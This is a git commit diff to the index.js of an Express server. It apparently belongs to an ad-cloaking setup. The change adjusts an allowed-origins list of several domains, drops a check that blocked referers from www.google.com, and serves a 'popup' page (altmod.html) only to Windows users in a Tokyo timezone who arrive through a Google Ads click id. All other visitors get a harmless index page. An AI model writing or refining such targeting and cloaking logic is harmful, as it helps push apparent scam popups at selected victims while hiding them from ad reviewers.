7aed7f8424bdad2aa1bfc4c87b741939389cc494
dsam36828 <159868637+dsam36828@users.noreply.github.com>
2024-02-26 18:45:21 +0530

    Update index.js

--- index.js
+++ index.js
@@ -8,22 +8,12 @@ const PORT = 3000 || process.env.PORT;
 const allowedOrigins = [
   "https://musubijp.com",
   "http://musubijp.com",
-  "https://musubijp.com/",
-  "http://musubijp.com/",
   "http://127.0.0.1:5501",
   "http://127.0.0.1:5500",
   "https://halcyoninjp.live",
   "http://halcyoninjp.live",
-  "https://halcyoninjp.live/",
-  "http://halcyoninjp.live/",
   "https://ufitmerchandise.in",
   "http://ufitmerchandise.in",
-  "https://ufitmerchandise.in/",
-  "http://ufitmerchandise.in/",
-  "https://hotnihonnews.today",
-  "http://hotnihonnews.today",
-  "https://hotnihonnews.today/",
-  "http://hotnihonnews.today/",
 ];
 
 // Normalize referer function to handle trailing slashes
@@ -34,19 +24,6 @@ const isWindowsOS = (userAgent) => {
   const isWindows = userAgent.includes("Windows");
   console.log(`Is Windows OS: ${isWindows}`);
   return isWindows;
-};
-
-// Helper function to check if the referer is allowed
-const isAllowedReferrer = (referer) => {
-  if (!referer) {
-    console.log("Referer is allowed: true (no referer)");
-    return true; // Proceed if no referer
-  }
-
-  const hostname = new URL(referer).hostname;
-  const isAllowed = !(hostname === "www.google.com");
-  console.log(`Referer is allowed: ${isAllowed} (hostname: ${hostname})`);
-  return isAllowed;
 };
 
 // CORS configuration
@@ -85,10 +62,11 @@ app.post(
     console.log(`Is Tokyo/Asia Timezone: ${isTokyoTimezone}`);
 
     // Check conditions and log them, removed check for gclid
-    if (isWindowsOS(userAgent) && isAllowedReferrer(referer) && isTokyoTimezone) {
+    if (isWindowsOS(userAgent) && isTokyoTimezone && fullUrl?.includes(`gclid`)) {
       console.log('popupsent');
       res.sendFile(path.join(__dirname, "altmod.html"));
     } else {
+      console.log('popup not sent');
       res.sendFile(path.join(__dirname, "index.html"));
     }
   }
